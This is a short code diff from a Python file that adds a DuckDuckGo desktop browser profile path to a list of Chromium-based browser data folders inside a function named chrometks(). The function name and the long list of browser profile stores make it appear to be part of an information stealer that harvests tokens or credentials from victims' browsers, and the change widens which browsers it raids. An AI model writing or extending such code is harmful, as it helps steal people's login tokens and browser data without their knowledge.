@@ -231,6 +231,7 @@ def chrometks():
             'Iridium': os.getenv("LOCALAPPDATA") + "\\Iridium\\User Data",
             'Vivaldi': os.getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data",
             'Yandex': os.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data",
+            'DuckDuckGo': os.getenv("LOCALAPPDATA") + "\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView",
         }
         
         for name, browser in otherchbrowsers.items():
